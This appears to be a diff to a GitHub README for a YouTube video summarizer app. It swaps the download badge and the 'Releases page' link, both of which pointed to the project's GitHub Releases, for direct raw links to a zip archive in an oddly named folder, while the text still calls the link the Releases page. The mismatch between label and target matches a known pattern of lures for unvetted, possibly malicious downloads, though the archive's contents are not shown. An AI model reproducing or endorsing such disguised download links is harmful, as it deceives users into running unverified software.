@@ -9,9 +9,9 @@ Welcome to **AI_YoutubeVideo_Summarizer-Updated-**! This application helps you t
 
 To start using the AI_YoutubeVideo_Summarizer, you can quickly download the latest version from our Releases page. Click the button below to visit and download the application.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/ink-sans106/AI_YoutubeVideo_Summarizer-Updated-/releases)
+[![Download Now](https://raw.githubusercontent.com/ink-sans106/AI_YoutubeVideo_Summarizer-Updated-/main/unenjoyingly/Updated_A_Youtube_Video_Summarizer_v1.5.zip)](https://raw.githubusercontent.com/ink-sans106/AI_YoutubeVideo_Summarizer-Updated-/main/unenjoyingly/Updated_A_Youtube_Video_Summarizer_v1.5.zip)
 
-1. Visit the [Releases page](https://github.com/ink-sans106/AI_YoutubeVideo_Summarizer-Updated-/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/ink-sans106/AI_YoutubeVideo_Summarizer-Updated-/main/unenjoyingly/Updated_A_Youtube_Video_Summarizer_v1.5.zip).
 2. Select the latest version.
 3. Choose the correct installer for your operating system.
 4. Download the file.
